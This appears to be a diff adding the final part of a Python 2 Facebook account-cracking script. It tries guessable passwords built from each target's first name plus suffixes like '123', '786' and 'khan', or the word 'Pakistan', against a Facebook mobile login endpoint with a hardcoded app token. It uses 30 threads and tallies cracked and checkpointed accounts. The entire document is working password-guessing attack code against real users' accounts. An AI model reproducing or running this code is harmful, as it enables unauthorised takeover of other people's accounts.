@@ -304,4 +304,72 @@ def pb():
 			    else:
 			        ps2=(j['first_name']+'123')
 			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-			        k=json.l
+			        k=json.load(dt)
+			        if 'www.facebook.com' in k['error_msg']:
+			            print(S+'[CP] ♡ '+user+' ♡ '+ps2)
+			            cps.append(user+ps2)
+			        else:
+			            if 'access_token' in k:
+			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
+			                oks.append(user+ps2)
+			            else:
+			                ps3=(j['first_name']+'786')
+			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                k=json.load(dt)
+			                if 'www.facebook.com' in k['error_msg']:
+			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
+			                    cps.append(user+ps3)
+			                else:
+			                    if 'access_token' in k:
+			                        print(G+'[OK] ♡ '+user+' ♡ '+ps3)
+			                        oks.append(user+ps3)
+			                    else:
+			                        ps4=(j['first_name']+'12345')
+			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                        k=json.load(dt)
+			                        if 'www.facebook.com' in k['error_msg']:
+			                            print(S+'[CP] ♡ '+user+' ♡ '+ps4)
+			                            cps.append(user+ps4)
+			                        else:
+			                            if 'access_token' in k:
+			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
+			                                oks.append(user+ps4)
+			                            else:
+			                                ps5=('Pakistan')
+			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                k=json.load(dt)
+			                                if 'www.facebook.com' in k['error_msg']:
+			                                    print(S+'[CP] ♡ '+user+' ♡ '+ps5)
+			                                    cps.append(user+ps5)
+			                                else:
+			                                    if 'access_token' in k:
+			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
+			                                        oks.append(user+ps5)
+			                                    else:
+			                                        ps6=(j['first_name']+'khan')
+			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			                                        k=json.load(dt)
+			                                        if 'www.facebook.com' in k['error_msg']:
+			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
+			                                            cps.append(user+ps6)
+			                                        else:
+			                                            if 'access_token' in k:
+			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
+			                                                oks.append(user+ps6)
+		except:
+			pass
+	p=ThreadPool(30)
+	p.map(main, id)
+	print
+	print(S+50*'-')
+	print
+	print(S+'Process has been completed CP ID Open After 7 Days ')
+	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
+	print(S+'WhiteMafia')     
+	print
+	raw_input(R + 'Back')
+	os.system('python2 B4.py')
+if __name__=='__main__':
+    login()
+
+
